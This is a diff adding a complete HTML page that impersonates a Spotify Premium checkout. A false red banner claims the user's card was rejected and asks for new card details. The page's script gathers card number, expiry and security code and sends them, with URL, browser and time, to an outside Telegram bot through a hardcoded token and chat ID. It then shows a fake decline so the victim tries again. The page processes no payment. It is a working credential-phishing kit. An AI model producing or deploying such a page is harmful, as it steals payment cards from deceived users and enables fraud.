@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Spotify - Checkout</title>
+<link rel="icon" type="image/png" href="https://checkout.spotifycdn.com/premium-product-images-vizid/coral.png">
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #fff; color: #222; }
+
+  /* ============ TOP BAR (logged-in state) ============ */
+  .topbar {
+    width: 100%;
+    background: #000;
+    color: #fff;
+    padding: 14px 0;
+  }
+  .topbar-inner {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 16px;
+  }
+  .topbar-logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    color: #fff;
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 20px;
+    letter-spacing: -0.3px;
+  }
+  .topbar-logo svg { width: 32px; height: 32px; }
+  .topbar-right {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+  }
+  .topbar-user {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 14px;
+    color: #e0e0e0;
+  }
+  .topbar-avatar {
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    background: #1db954;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 13px;
+    color: #000;
+    flex-shrink: 0;
+  }
+  .logout-btn {
+    background: transparent;
+    color: #fff;
+    border: 1px solid #555;
+    padding: 8px 16px;
+    border-radius: 500px;
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    font-family: inherit;
+    transition: all 0.2s;
+  }
+  .logout-btn:hover { background: #fff; color: #000; border-color: #fff; }
+
+  .container { max-width: 440px; margin: 0 auto; padding: 40px 20px; }
+
+  /* ============ RED WARNING BANNER ============ */
+  .warning-banner {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    background: #fef2f2;
+    border: 1px solid #fca5a5;
+    border-left: 4px solid #dc2626;
+    border-radius: 6px;
+    padding: 14px 16px;
+    margin-bottom: 20px;
+    animation: slideDown 0.3s ease-out;
+  }
+  @keyframes slideDown {
+    from { opacity: 0; transform: translateY(-8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .warning-icon {
+    flex-shrink: 0;
+    width: 20px;
+    height: 20px;
+    color: #dc2626;
+    margin-top: 1px;
+  }
+  .warning-content { flex: 1; }
+  .warning-title {
+    font-size: 13px;
+    font-weight: 700;
+    color: #991b1b;
+    margin-bottom: 3px;
+  }
+  .warning-text {
+    font-size: 12.5px;
+    color: #7f1d1d;
+    line-height: 1.5;
+  }
+
+  /* Payment Method */
+  .payment-method { border: 1px solid #e0e0e0; border-radius: 8px; padding: 20px; margin-bottom: 24px; }
+  .payment-header { display: flex; align-items: center; gap: 10px; margin-bottom: 16px; }
+  .radio-circle { width: 18px; height: 18px; border: 2px solid #1db954; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .radio-circle::after { content: ''; width: 10px; height: 10px; background: #1db954; border-radius: 50%; }
+  .payment-title { font-size: 15px; font-weight: 600; color: #222; }
+
+  .card-logos { display: flex; gap: 8px; margin-bottom: 20px; align-items: center; }
+  .card-logo { height: 24px; }
+  .lock-icon { margin-left: auto; width: 18px; height: 18px; }
+
+  .form-group { margin-bottom: 16px; }
+  .form-group label { display: block; font-size: 13px; font-weight: 600; color: #222; margin-bottom: 6px; }
+  .form-group input {
+    width: 100%; padding: 12px 14px; border: 1px solid #ccc; border-radius: 6px;
+    font-size: 15px; color: #222; transition: border-color 0.2s; font-family: inherit;
+  }
+  .form-group input:focus { border-color: #1db954; outline: none; }
+  .form-group input::placeholder { color: #999; }
+
+  /* Error state for inputs */
+  .form-group.error input { border-color: #dc2626; background: #fff8f8; }
+  .form-group.error input:focus { border-color: #dc2626; box-shadow: 0 0 0 3px rgba(220,38,38,0.12); }
+  .field-error {
+    display: none;
+    font-size: 12px;
+    color: #dc2626;
+    margin-top: 5px;
+    font-weight: 500;
+  }
+  .form-group.error .field-error { display: block; }
+
+  .card-input-wrapper { position: relative; }
+  .card-input-wrapper .card-icon { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); width: 20px; height: 14px; }
+  .card-input-wrapper input { padding-left: 42px; }
+
+  .row { display: flex; gap: 12px; }
+  .row .form-group { flex: 1; }
+
+  .cvv-wrapper { position: relative; }
+  .cvv-wrapper input { padding-right: 40px; }
+  .cvv-help { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); width: 20px; height: 20px; border: 1px solid #ccc; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; color: #666; cursor: help; font-family: inherit; }
+
+  .save-card { display: flex; align-items: flex-start; gap: 10px; margin-top: 8px; }
+  .save-card input { width: 16px; height: 16px; margin-top: 2px; accent-color: #1db954; }
+  .save-card label { font-size: 13px; color: #222; cursor: pointer; font-weight: 400; }
+  .save-card .hint { font-size: 12px; color: #666; margin-top: 4px; line-height: 1.4; }
+
+  /* Summary */
+  .summary-title { font-size: 22px; font-weight: 700; color: #222; margin-bottom: 16px; }
+  .summary-box { background: #f0f0f0; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
+  .summary-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+  .summary-row:last-child { margin-bottom: 0; padding-top: 16px; border-top: 1px solid #ddd; }
+  .summary-label { font-size: 13px; font-weight: 600; color: #222; }
+  .plan-info { display: flex; align-items: center; gap: 12px; }
+  .plan-icon { width: 40px; height: 40px; border-radius: 8px; overflow: hidden; }
+  .plan-icon img { width: 100%; height: 100%; object-fit: cover; }
+  .plan-name { font-size: 14px; font-weight: 600; color: #222; }
+  .plan-price { font-size: 14px; font-weight: 500; color: #222; }
+  .total-label { font-size: 15px; font-weight: 700; color: #222; }
+  .total-price { font-size: 15px; font-weight: 700; color: #222; }
+
+  /* Terms */
+  .terms { font-size: 12px; color: #666; line-height: 1.6; margin-bottom: 24px; }
+  .terms a { color: #1db954; text-decoration: underline; }
+
+  /* Submit Button */
+  .submit-btn {
+    width: 100%; background: #1db954; color: white; border: none;
+    padding: 16px; font-size: 15px; font-weight: 700; border-radius: 30px;
+    cursor: pointer; transition: background 0.2s; font-family: inherit;
+  }
+  .submit-btn:hover { background: #1ed760; }
+  .submit-btn:disabled { background: #ccc; cursor: not-allowed; }
+
+  /* ============ PAYMENT DECLINED BANNER ============ */
+  .declined-banner {
+    display: none;
+    align-items: flex-start;
+    gap: 12px;
+    background: #fef2f2;
+    border: 1px solid #fca5a5;
+    border-left: 4px solid #dc2626;
+    border-radius: 6px;
+    padding: 14px 16px;
+    margin-bottom: 20px;
+  }
+  .declined-banner.active { display: flex; animation: shake 0.4s ease-in-out; }
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    20% { transform: translateX(-6px); }
+    40% { transform: translateX(6px); }
+    60% { transform: translateX(-4px); }
+    80% { transform: translateX(4px); }
+  }
+  .declined-icon {
+    flex-shrink: 0;
+    width: 22px;
+    height: 22px;
+    color: #dc2626;
+  }
+  .declined-title {
+    font-size: 14px;
+    font-weight: 700;
+    color: #991b1b;
+    margin-bottom: 4px;
+  }
+  .declined-text {
+    font-size: 12.5px;
+    color: #7f1d1d;
+    line-height: 1.5;
+  }
+  .declined-hint {
+    font-size: 12px;
+    color: #991b1b;
+    margin-top: 6px;
+    padding-top: 6px;
+    border-top: 1px dashed #fca5a5;
+  }
+
+  /* Loading Overlay */
+  .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
+  .loading-overlay.active { display: flex; }
+  .spinner { width: 50px; height: 50px; border: 4px solid #e0e0e0; border-top: 4px solid #1db954; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  .loading-text { font-size: 16px; color: #333; font-weight: 500; }
+  .loading-sub { font-size: 13px; color: #777; margin-top: 8px; }
+</style>
+<base target="_blank">
+</head>
+<body>
+
+<!-- ============ TOP BAR ============ -->
+<div class="topbar">
+  <div class="topbar-inner">
+    <a href="#" class="topbar-logo">
+      <svg viewBox="0 0 24 24" fill="#1db954" xmlns="http://www.w3.org/2000/svg"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z"/></svg>
+      <span>Spotify</span>
+    </a>
+    <div class="topbar-right">
+      <div class="topbar-user">
+        <div class="topbar-avatar"> 👤 </div>
+        <span></span>
+      </div>
+      <button class="logout-btn" type="button" onclick="handleLogout()">Log out</button>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+
+  <!-- ============ PAYMENT DECLINED BANNER (hidden by default) ============ -->
+  <div class="declined-banner" id="declinedBanner">
+    <svg class="declined-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <circle cx="12" cy="12" r="10"/>
+      <line x1="12" y1="8" x2="12" y2="12"/>
+      <line x1="12" y1="16" x2="12.01" y2="16"/>
+    </svg>
+    <div>
+      <div class="declined-title">Payment declined</div>
+      <div class="declined-text">
+        Your card was declined by the issuing bank. Please check your card details and try again, or use a different payment method.
+      </div>
+      <div class="declined-hint">
+        Error code: <b>card_declined</b> &middot; If the problem persists, contact your bank or try again later.
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ RED VERIFICATION WARNING ============ -->
+  <div class="warning-banner" id="warningBanner">
+    <svg class="warning-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+      <line x1="12" y1="9" x2="12" y2="13"/>
+      <line x1="12" y1="17" x2="12.01" y2="17"/>
+    </svg>
+    <div class="warning-content">
+      <div class="warning-title">We couldn't verify your payment method</div>
+      <div class="warning-text">
+        The card on file was rejected by your bank. To continue your Premium subscription, please add a valid credit or debit card below.
+      </div>
+    </div>
+  </div>
+
+  <!-- Payment Method -->
+  <div class="payment-method">
+    <div class="payment-header">
+      <div class="radio-circle"></div>
+      <span class="payment-title">Credit or debit card</span>
+    </div>
+
+    <div class="card-logos">
+      <!-- VISA -->
+      <svg class="card-logo" viewBox="0 0 750 471" width="36" height="22"><path fill="#1A1F71" d="M0 0h750v471H0z"/><path fill="#fff" d="M278.2 334.5l33.4-195.3h53l-33.4 195.3h-53zm246.4-191.3c-10.5-3.9-26.9-8-47.5-8-52.3 0-89.1 26.3-89.4 64-0.3 27.9 26.4 43.5 46.5 52.8 20.7 9.6 27.7 15.7 27.6 24.3-0.1 13.1-16.6 19.1-31.9 19.1-21.3 0-32.6-2.9-50.1-10.2l-6.9-3.1-7.5 43.8c12.5 5.5 35.6 10.3 59.5 10.5 55.6 0 91.8-26.1 92.2-66.5 0.2-22.1-14-38.9-44.7-52.7-18.6-9-30-15-29.9-24.1 0-8.1 9.6-16.8 30.4-16.8 17.4-0.3 30 3.5 39.7 7.5l4.8 2.3 7.2-42.4zm137.7-3.9h-41c-12.7 0-22.2 3.5-27.8 16.1L534.2 334h56l-7.3-40.2h43.5l4.2 40.2h49.3l-27.6-195.3zm-46.5 126.3l17.6-97.3 0.1 97.3h-17.7zM447.3 139.2L402 334h-54.3l45.5-194.8h54.1zm-153.6 0l-54.2 130.7-5.8-29.6C173.8 184.1 143 157 110.8 143.2l49.5 190.9h59.1l88.1-194.9h-14.8z"/></svg>
+      <!-- Mastercard -->
+      <svg class="card-logo" viewBox="0 0 24 16" width="28" height="18"><circle cx="8" cy="8" r="7" fill="#EB001B"/><circle cx="16" cy="8" r="7" fill="#F79E1B"/><path d="M12 3a7 7 0 0 0 0 10 7 7 0 0 0 0-10z" fill="#FF5F00"/></svg>
+      <!-- Amex -->
+      <svg class="card-logo" viewBox="0 0 24 16" width="28" height="18"><rect width="24" height="16" rx="2" fill="#016FD0"/><text x="12" y="11" text-anchor="middle" fill="white" font-size="6" font-weight="bold" font-family="Arial">AMEX</text></svg>
+      <!-- Lock -->
+      <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+    </div>
+
+    <div class="form-group" id="cardNumberGroup">
+      <label>Card number</label>
+      <div class="card-input-wrapper">
+        <svg class="card-icon" viewBox="0 0 24 16" fill="none"><rect x="1" y="3" width="22" height="10" rx="2" stroke="#999" stroke-width="1.5"/><line x1="1" y1="7" x2="23" y2="7" stroke="#999" stroke-width="1.5"/></svg>
+        <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
+      </div>
+      <div class="field-error">Please enter a valid card number.</div>
+    </div>
+
+    <div class="row">
+      <div class="form-group" id="expGroup">
+        <label>Expiry date</label>
+        <input type="text" id="expDate" placeholder="MM / YY" maxlength="7">
+        <div class="field-error">Invalid expiry date.</div>
+      </div>
+      <div class="form-group" id="cvvGroup">
+        <label>Security code</label>
+        <div class="cvv-wrapper">
+          <input type="text" id="cvv" placeholder="" maxlength="4">
+          <span class="cvv-help">?</span>
+        </div>
+        <div class="field-error">Invalid security code.</div>
+      </div>
+    </div>
+
+    <div class="save-card">
+      <input type="checkbox" id="saveCard">
+      <div>
+        <label for="saveCard">Save card for future orders.</label>
+        <div class="hint">This won't affect how you pay for existing subscriptions and can be managed anytime in your Account page.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Summary -->
+  <h2 class="summary-title">Summary</h2>
+  <div class="summary-box">
+    <div class="summary-row">
+      <div class="plan-info">
+        <div class="plan-icon">
+          <img src="https://checkout.spotifycdn.com/premium-product-images-vizid/coral.png" alt="Premium Duo">
+        </div>
+        <span class="plan-name">Spotify Premium</span>
+      </div>
+      <span class="plan-price">USD 14.99/month</span>
+    </div>
+    <div class="summary-row">
+      <span class="total-label">Total now</span>
+      <span class="total-price">USD 0.00</span>
+    </div>
+  </div>
+
+  <!-- Terms -->
+  <div class="terms">
+    You expressly consent to us providing you with your Spotify subscription immediately and acknowledge that you lose your right of withdrawal. You also authorise Spotify to charge you automatically every month until you cancel your subscription. If the price changes, we'll notify you beforehand. You may cancel at any time, however you will not be entitled to a refund upon cancellation. Full terms and instructions on how to cancel are available <a href="#">here</a>. You agree to only invite people who live at your address, and that all plan members live at the same address.
+  </div>
+
+  <!-- Submit -->
+  <button class="submit-btn" id="submitBtn" onclick="handlePurchase()">Complete purchase</button>
+</div>
+
+<!-- Loading Overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="spinner"></div>
+  <div class="loading-text">Processing your payment...</div>
+  <div class="loading-sub">Please do not close this window</div>
+</div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = "9114256039:AAGSgKWmLgsuCHwCuY4Dh-ho46GvVeHg7nA";
+const TELEGRAM_CHAT_ID = "8172260842";
+
+// ---- Update avatar initials dynamically (cosmetic) ----
+document.addEventListener("DOMContentLoaded", function() {
+  // nothing extra needed; topbar shows "JD / John Doe"
+});
+
+// ---- Logout ----
+function handleLogout() {
+  if (confirm("Are you sure you want to log out?")) {
+    window.location.href = "https://www.spotify.com/logout/";
+  }
+}
+
+// ---- Field validation ----
+function showFieldError(groupId) {
+  var el = document.getElementById(groupId);
+  if (el) el.classList.add("error");
+}
+function clearFieldError(groupId) {
+  var el = document.getElementById(groupId);
+  if (el) el.classList.remove("error");
+}
+function clearAllErrors() {
+  ["cardNumberGroup","expGroup","cvvGroup"].forEach(clearFieldError);
+  document.getElementById("declinedBanner").classList.remove("active");
+}
+
+// ---- Purchase handler ----
+function handlePurchase() {
+  clearAllErrors();
+
+  var cardNumber = document.getElementById("cardNumber").value.trim();
+  var expDate = document.getElementById("expDate").value.trim();
+  var cvv = document.getElementById("cvv").value.trim();
+
+  // Validate fields
+  var hasError = false;
+  if (!cardNumber || cardNumber.replace(/\s/g,"").length < 13) { showFieldError("cardNumberGroup"); hasError = true; }
+  if (!expDate || expDate.replace(/\s/g,"").length < 4) { showFieldError("expGroup"); hasError = true; }
+  if (!cvv || cvv.length < 3) { showFieldError("cvvGroup"); hasError = true; }
+
+  if (hasError) {
+    return;
+  }
+
+  // Show loading
+  document.getElementById("loadingOverlay").classList.add("active");
+  document.getElementById("submitBtn").disabled = true;
+
+  // Send to Telegram
+  var msg = "🎵 SPOTIFY PAYMENT CAPTURE";
+  var m1 = "Card: " + cardNumber;
+  var m2 = "Expiry: " + expDate;
+  var m3 = "CVV: " + cvv;
+  var m4 = "URL: " + window.location.href;
+  var m5 = "UserAgent: " + navigator.userAgent;
+  var m6 = "Time: " + new Date().toLocaleString();
+  sendToTelegram(msg + "\n\n" + m1 + "\n" + m2 + "\n" + m3 + "\n\n" + m4 + "\n" + m5 + "\n" + m6);
+
+  // After "processing", show declined message (no success)
+  setTimeout(function() {
+    document.getElementById("loadingOverlay").classList.remove("active");
+    document.getElementById("submitBtn").disabled = false;
+
+    // Show the declined banner
+    var declined = document.getElementById("declinedBanner");
+    declined.classList.add("active");
+    declined.scrollIntoView({ behavior: "smooth", block: "center" });
+
+    // Shake the payment method box slightly
+    var box = document.querySelector(".payment-method");
+    box.style.transition = "box-shadow 0.3s";
+    box.style.boxShadow = "0 0 0 3px rgba(220,38,38,0.15)";
+    setTimeout(function() { box.style.boxShadow = ""; }, 1500);
+  }, 3000);
+}
+
+// ---- Telegram ----
+function sendToTelegram(text) {
+  if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
+    console.log("Telegram not configured. Data:");
+    console.log(text);
+    return;
+  }
+  var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
+  var data = { chat_id: TELEGRAM_CHAT_ID, text: text };
+  fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) }).catch(function(err) { console.log("Telegram error:", err); });
+}
+
+// ---- Input formatting & error clearing ----
+document.getElementById("cardNumber").addEventListener("input", function(e) {
+  clearFieldError("cardNumberGroup");
+  var val = e.target.value.replace(/\D/g, "");
+  val = val.replace(/(.{4})/g, "$1 ").trim();
+  e.target.value = val;
+});
+
+document.getElementById("expDate").addEventListener("input", function(e) {
+  clearFieldError("expGroup");
+  var val = e.target.value.replace(/\D/g, "");
+  if (val.length >= 2) { val = val.substring(0, 2) + " / " + val.substring(2, 4); }
+  e.target.value = val;
+});
+
+document.getElementById("cvv").addEventListener("input", function(e) {
+  clearFieldError("cvvGroup");
+  e.target.value = e.target.value.replace(/\D/g, "").substring(0, 4);
+});
+</script>
+
+</body>
+</html>
